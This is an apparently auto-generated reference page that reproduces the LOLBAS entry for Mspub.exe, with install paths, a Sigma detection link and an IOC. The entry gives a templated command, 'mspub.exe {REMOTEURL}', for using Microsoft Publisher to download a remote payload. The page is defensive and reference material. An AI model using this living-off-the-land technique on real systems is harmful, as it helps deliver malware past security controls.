---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Mspub.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `mspub.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Mspub.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Mspub.exe](../../tools/windows/mspub.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | mspub.exe |
| name | Mspub.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Nir Chako
Commands:
- Category: Download
  Command: mspub.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2022-08-02
Description: Microsoft Publisher
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
- IOC: Suspicious Office application internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office16\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office15\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe
- Path: C:\Program Files\Microsoft Office\Office14\MSPUB.exe
Name: Mspub.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Mspub.yml
```

## Detection / Analysis Notes

```text
IOC: Suspicious Office application internet/network traffic
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
- IOC: Suspicious Office application internet/network traffic
```
